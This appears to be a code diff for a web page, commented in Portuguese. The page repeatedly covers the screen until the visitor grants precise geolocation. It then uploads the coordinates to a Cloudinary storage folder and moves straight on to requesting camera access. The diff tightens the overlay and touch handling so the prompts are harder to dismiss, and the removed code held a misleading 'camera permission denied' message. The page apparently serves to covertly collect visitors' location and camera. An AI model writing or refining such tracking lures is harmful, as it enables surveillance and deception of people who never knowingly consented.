@@ -25,41 +25,37 @@
     const overlay = document.getElementById('overlay');
     const geoOpts = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
 
+    // Mostra overlay e registra os eventos click e touchend
     function showOverlay(msg, handler) {
       overlay.textContent = msg;
       overlay.style.display = 'flex';
-      overlay.onclick = handler;
+      // Remover handlers antigos
+      overlay.onclick = null;
+      overlay.replaceWith(overlay.cloneNode(true));
+      // Re-obtenha após clone
+      const newOverlay = document.getElementById('overlay');
+      newOverlay.textContent = msg;
+      newOverlay.style.display = 'flex';
+      // Handler em click
+      newOverlay.addEventListener('click', handler, { once: true });
+      // Handler em touchend para Safari iOS
+      newOverlay.addEventListener('touchend', e => { e.preventDefault(); handler(); }, { once: true });
     }
     function hideOverlay() {
-      overlay.style.display = 'none';
+      const el = document.getElementById('overlay');
+      el.style.display = 'none';
     }
 
     function askLocation() {
       hideOverlay();
       navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, geoOpts);
     }
-    function onGeoError(error) {
-      // Safari iOS workaround: se permissão já concedida, tente novamente
-      if (navigator.permissions) {
-        navigator.permissions.query({ name: 'geolocation' }).then(result => {
-          if (result.state === 'granted') {
-            // solicitar novamente para obter coords
-            navigator.geolocation.getCurrentPosition(onGeoSuccess, () => {
-              showOverlay('Toque para permitir a localização', askLocation);
-            }, geoOpts);
-          } else {
-            showOverlay('Toque para permitir a localização', askLocation);
-          }
-        }).catch(() => {
-          showOverlay('Toque para permitir a localização', askLocation);
-        });
-      } else {
-        showOverlay('Toque para permitir a localização', askLocation);
-      }
+
+    function onGeoError() {
+      showOverlay('Toque para permitir a localização', askLocation);
     }
 
     function onGeoSuccess(pos) {
-      // evita repetir overlay em Safari: segue direto para câmera
       hideOverlay();
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
@@ -70,16 +66,8 @@
       form.append('folder', folderName);
       fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form })
         .then(() => {
-                    // após sucesso de localização, decide como pedir câmera
-          const ua = navigator.userAgent;
-          const isIosSafari = /iP(hone|od|ad)/.test(navigator.platform) && /Safari/.test(ua) && !/CriOS/.test(ua);
-          if (isIosSafari) {
-            // no iOS Safari, mostra overlay para disparar getUserMedia com user gesture
-            showOverlay('Permissão de câmera negada. Toque para permitir o acesso à câmera', requestCamera);
-          } else {
-            // outros navegadores: chama direto
-            requestCamera();
-          }
+          // Após localização, ir para câmera
+          requestCamera();
         })
         .catch(() => {
           showOverlay('Erro ao enviar localização. Toque para tentar novamente.', askLocation);
